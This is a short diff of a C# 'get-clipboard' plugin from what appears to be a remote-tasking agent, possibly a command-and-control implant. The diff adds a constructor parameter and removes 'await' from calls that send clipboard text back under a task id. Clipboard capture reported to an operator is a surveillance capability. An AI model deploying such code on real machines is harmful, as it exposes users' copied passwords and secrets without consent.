@@ -161,7 +161,7 @@ namespace Agent
         public string Name => "get-clipboard";
         private IMessageManager messageManager { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
         }
@@ -173,20 +173,20 @@ namespace Agent
             {
                 if (OperatingSystem.IsMacOS())
                 {
-                    await messageManager.Write(OsxClipboard.GetText(), job.task.id, true);
+                    messageManager.Write(OsxClipboard.GetText(), job.task.id, true);
                 }
                 else if (OperatingSystem.IsWindows())
                 {
-                    await messageManager.Write(WindowsClipboard.GetText(), job.task.id, true);
+                    messageManager.Write(WindowsClipboard.GetText(), job.task.id, true);
                 }
                 else
                 {
-                    await messageManager.Write("Not implemented on this OS yet.", job.task.id, true, "error");
+                    messageManager.Write("Not implemented on this OS yet.", job.task.id, true, "error");
                 }
             }
             catch (Exception e)
             {
-                await messageManager.Write(e.ToString(), job.task.id, true, "error");
+                messageManager.Write(e.ToString(), job.task.id, true, "error");
                 return;
             }
         }
